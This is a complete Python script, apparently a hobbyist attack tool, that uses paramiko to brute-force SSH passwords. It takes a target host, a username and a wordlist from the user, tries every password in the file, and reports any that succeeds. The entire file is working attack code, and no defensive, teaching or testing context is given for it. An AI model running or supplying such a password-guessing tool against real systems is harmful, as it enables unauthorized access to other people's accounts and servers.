import sys
import os
import socket

import termcolor
import paramiko


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code


host = input("[+] target addrress: ")
username = input("[+] SSH username: ")
input_file = input("[+] Passwords file: ")

if not os.path.exists(input_file):
    print(f"[!!] the file {input_file} does not exist")
    exit(1)

with open(input_file) as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(
                    termcolor.colored(
                        f"[+] found password: {password} for account {username}",
                        'green'
                    )
                )
            elif response == 1:
                print(f"[-] incorrect login {password}")
            elif response == 2:
                print("[!!] cannot connect")
                exit()
        except Exception as e:
            print(e)
            pass
